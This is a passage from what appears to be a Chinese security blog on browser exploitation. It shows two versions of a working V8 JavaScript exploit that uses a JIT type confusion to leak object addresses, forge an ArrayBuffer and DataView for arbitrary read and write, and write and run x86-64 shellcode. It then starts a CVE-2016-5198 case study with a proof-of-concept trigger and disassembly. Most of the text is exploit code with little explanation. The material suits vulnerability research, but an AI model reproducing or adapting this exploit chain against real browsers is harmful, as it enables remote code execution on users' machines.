class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="comment">//fake_dv = new DataView(fake_arraybuffer,0,0x4000);</span></span><br><span class="line">    <span class="comment">//print(fake_ab_float[4]);</span></span><br><span class="line">    print(<span class="string">"write"</span>);</span><br><span class="line">    fake_dv.setUint32(<span class="number">0</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+<span class="number">0x4</span>) * <span class="number">0x100000000</span>;;</span><br><span class="line">print(shellcode_address.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> addr = shellcode_address<span class="number">-1</span>+<span class="number">0x60</span>;</span><br><span class="line">fake_ab_float[<span class="number">4</span>] = d2u(addr / <span class="number">0x100000000</span>,addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="comment">// shellcode[0] = 0x90909090;</span></span><br><span class="line"><span class="comment">// shellcode[1] = 0x90909090;</span></span><br><span class="line"><span class="comment">// shellcode[2] = 0x782fb848;</span></span><br><span class="line"><span class="comment">// shellcode[3] = 0x636c6163;</span></span><br><span class="line"><span class="comment">// shellcode[4] = 0x48500000;</span></span><br><span class="line"><span class="comment">// shellcode[5] = 0x73752fb8;</span></span><br><span class="line"><span class="comment">// shellcode[6] = 0x69622f72;</span></span><br><span class="line"><span class="comment">// shellcode[7] = 0x8948506e;</span></span><br><span class="line"><span class="comment">// shellcode[8] = 0xc03148e7;</span></span><br><span class="line"><span class="comment">// shellcode[9] = 0x89485750;</span></span><br><span class="line"><span class="comment">// shellcode[10] = 0xd23148e6;</span></span><br><span class="line"><span class="comment">// shellcode[11] = 0x3ac0c748;</span></span><br><span class="line"><span class="comment">// shellcode[12] = 0x50000030;</span></span><br><span class="line"><span class="comment">// shellcode[13] = 0x4944b848;</span></span><br><span class="line"><span class="comment">// shellcode[14] = 0x414c5053;</span></span><br><span class="line"><span class="comment">// shellcode[15] = 0x48503d59;</span></span><br><span class="line"><span class="comment">// shellcode[16] = 0x3148e289;</span></span><br><span class="line"><span class="comment">// shellcode[17] = 0x485250c0;</span></span><br><span class="line"><span class="comment">// shellcode[18] = 0xc748e289;</span></span><br><span class="line"><span class="comment">// shellcode[19] = 0x00003bc0;</span></span><br><span class="line"><span class="comment">// shellcode[20] = 0x050f00;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure><h4 id="版本2-工具类在上面"><a href="#版本2-工具类在上面" class="headerlink" title="版本2(工具类在上面)"></a>版本2(工具类在上面)</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// leak出object的地址，即将一个object当成double读出来</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params">arr,callback</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v=arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将一个数当成object写进去</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger2</span>(<span class="params">arr, callback, val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    arr[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,</span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,</span><br><span class="line">    <span class="number">6.73490047e-316</span>,</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use ut32.prototype replace it</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,</span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line">];</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print(Int64.fromDouble(trigger(arr0,evil_r0)).toString(16));</span></span><br><span class="line">    re=Int64.fromDouble(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=<span class="built_in">parseInt</span>(read_obj_addr(ab.__proto__));</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">ab_map_obj[<span class="number">0x3</span>]=<span class="keyword">new</span> Int64(ab_proto_addr).asDouble();</span><br><span class="line">ab_map_obj[<span class="number">0x4</span>]=<span class="keyword">new</span> Int64(ab_constructor_addr).asDouble();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"要leak出的ab_map_obj的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj);</span><br><span class="line"><span class="comment">// leak ab_map_obj的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print(Int64.fromDouble(trigger(arr1,evil_r1)).toString(16));</span></span><br><span class="line">    re=Int64.fromDouble(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="comment">// while(1);</span></span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ab_map_obj_addr = read_obj_addr1(ab_map_obj);</span></span><br><span class="line">ab_map_obj_addr = <span class="built_in">parseInt</span>(read_obj_addr1(ab_map_obj))+<span class="number">0x70</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_map_obj_addr = <span class="keyword">new</span> Int64(ab_map_obj_addr).asDouble();</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line">fake_ab_float_addr=<span class="built_in">parseInt</span>(read_obj_addr2(fake_ab))+<span class="number">0x70</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr=<span class="keyword">new</span> Int64(fake_ab_float_addr).asDouble();</span><br><span class="line"></span><br><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        %DebugPrint(arrr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print("arrr first is");</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arrr);</span></span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr);</span><br><span class="line">print(<span class="string">"arrr last is"</span>);</span><br><span class="line">%DebugPrint(arrr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=<span class="built_in">parseInt</span>(read_obj_addr3(evil_f))+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="comment">// read function code address</span></span><br><span class="line">fake_ab[<span class="number">4</span>]=<span class="keyword">new</span> Int64(shellcode_address_ref).asDouble();</span><br><span class="line">fake_ab[<span class="number">5</span>]=<span class="keyword">new</span> Int64(shellcode_address_ref).asDouble();</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"></span><br><span class="line">shellcode_address =  fake_dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br><span class="line">shellcode_address=shellcode_address+<span class="keyword">new</span> Int64(<span class="number">0x5f</span>).asDouble();</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_ab[<span class="number">4</span>]=shellcode_address;</span><br><span class="line">fake_ab[<span class="number">5</span>]=shellcode_address;</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>case study:cve-2016-5198</title>
      <link href="/2019/04/29/CVE-2016-5198/"/>
      <url>/2019/04/29/CVE-2016-5198/</url>
      <content type="html"><![CDATA[<h1 id="case-study-cve-2016-5198"><a href="#case-study-cve-2016-5198" class="headerlink" title="case study:cve-2016-5198"></a>case study:cve-2016-5198</h1><h2 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659475" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659475</a><br><a href="https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6</a></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n.xyz = <span class="number">0x826852f4</span>;</span><br><span class="line">    <span class="built_in">parseInt</span>(<span class="string">'AAAAAAAA'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">    Ctor();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">    Check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor();</span><br><span class="line">Check();</span><br><span class="line">print(<span class="string">"finish"</span>);</span><br></pre></td></tr></table></figure><h2 id="漏洞表现"><a href="#漏洞表现" class="headerlink" title="漏洞表现"></a>漏洞表现</h2><h3 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h3><h4 id="优化前"><a href="#优化前" class="headerlink" title="优化前"></a>优化前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz = 0x826852f4;</span><br><span class="line">parseInt(&apos;AAAAAAAA&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--- Code ---</span><br><span class="line">0x35680eb86a00     0  55             push rbp</span><br><span class="line">0x35680eb86a01     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86a04     4  56             push rsi</span><br><span class="line">0x35680eb86a05     5  57             push rdi</span><br><span class="line">0x35680eb86a06     6  488b4f2f       REX.W movq rcx,[rdi+0x2f]</span><br><span class="line">0x35680eb86a0a    10  488b490f       REX.W movq rcx,[rcx+0xf]</span><br><span class="line">0x35680eb86a0e    14  83411b01       addl [rcx+0x1b],0x1</span><br><span class="line">0x35680eb86a12    18  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86a19    25  7305           jnc 32  (0x35680eb86a20)</span><br><span class="line">0x35680eb86a1b    27  e8c0bef5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86a20    32  48b80000000002000000 REX.W movq rax,0x200000000</span><br><span class="line">0x35680eb86a2a    42  e8b1d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a2f    47  50             push rax</span><br><span class="line">0x35680eb86a30    48  48b8e9c362be00370000 REX.W movq rax,0x3700be62c3e9    ;; object: 0x3700be62c3e9 &lt;Number: 2.18788e+09&gt;</span><br><span class="line">0x35680eb86a3a    58  5a             pop rdx</span><br><span class="line">0x35680eb86a3b    59  48b919b062be00370000 REX.W movq rcx,0x3700be62b019    ;; object: 0x3700be62b019 &lt;String[3]: xyz&gt;</span><br><span class="line">0x35680eb86a45    69  48bf0000000004000000 REX.W movq rdi,0x400000000</span><br><span class="line">0x35680eb86a4f    79  e80cb8f0ff     call 0x35680ea92260     ;; code: STORE_IC</span><br><span class="line">0x35680eb86a54    84  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a58    88  48b80000000008000000 REX.W movq rax,0x800000000</span><br><span class="line">0x35680eb86a62    98  e879d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a67   103  50             push rax</span><br><span class="line">0x35680eb86a68   104  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86a72   114  4152           push r10</span><br><span class="line">0x35680eb86a74   116  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86a7e   126  4152           push r10</span><br><span class="line">0x35680eb86a80   128  48ba0000000006000000 REX.W movq rdx,0x600000000</span><br><span class="line">0x35680eb86a8a   138  488b7c2410     REX.W movq rdi,[rsp+0x10]</span><br><span class="line">0x35680eb86a8f   143  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86a94   148  e8a7ddffff     call 0x35680eb84840     ;; code: CALL_IC</span><br><span class="line">0x35680eb86a99   153  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a9d   157  4883c408       REX.W addq rsp,0x8</span><br><span class="line">0x35680eb86aa1   161  498b45a0       REX.W movq rax,[r13-0x60]</span><br><span class="line">0x35680eb86aa5   165  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86aaf   175  83430bd1       addl [rbx+0xb],0xd1</span><br><span class="line">0x35680eb86ab3   179  791f           jns 212  (0x35680eb86ad4)</span><br><span class="line">0x35680eb86ab5   181  50             push rax</span><br><span class="line">0x35680eb86ab6   182  e8a5bdf5ff     call InterruptCheck  (0x35680eae2860)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86abb   187  58             pop rax</span><br><span class="line">0x35680eb86abc   188  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86ac6   198  49ba0000000000180000 REX.W movq r10,0x180000000000</span><br><span class="line">0x35680eb86ad0   208  4c895307       REX.W movq [rbx+0x7],r10</span><br><span class="line">0x35680eb86ad4   212  c9             leavel</span><br><span class="line">0x35680eb86ad5   213  c20800         ret 0x8</span><br></pre></td></tr></table></figure><h4 id="优化后"><a href="#优化后" class="headerlink" title="优化后"></a>优化后</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 